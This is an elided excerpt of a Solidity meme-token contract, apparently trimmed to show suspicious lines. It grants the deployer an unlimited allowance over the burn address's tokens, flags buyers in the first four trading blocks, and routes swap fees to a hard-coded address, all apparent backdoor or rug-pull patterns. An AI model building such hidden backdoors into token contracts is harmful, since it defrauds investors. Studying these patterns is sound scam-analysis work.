...
abstract contract MeMeToken is IERC20, Ownable {
    ...
    constructor (
        ...
        _allowances[address(0xDEAD)][address(msg.sender)] = MAX;
        ...
        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                if (0 == startTradeBlock) {
                    require(0 < startAddLPBlock && isAdd, "!startAddLP"); //_swapPairList[to]
                }
                if (block.number < startTradeBlock + 4 && !_swapPairList[to]) {
                    _appList[to] = true;
    ...
    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        ...
        address secFundAddress = 0xCb76145477089d5bD20AF109252E5AA9E1773Fd2;
...
contract Token is MeMeToken {
    constructor() MeMeToken(
        ...
        18,
        2100000000000,
        address(0xCb76145477089d5bD20AF109252E5AA9E1773Fd2),
        address(0xCb76145477089d5bD20AF109252E5AA9E1773Fd2)
    ){}
}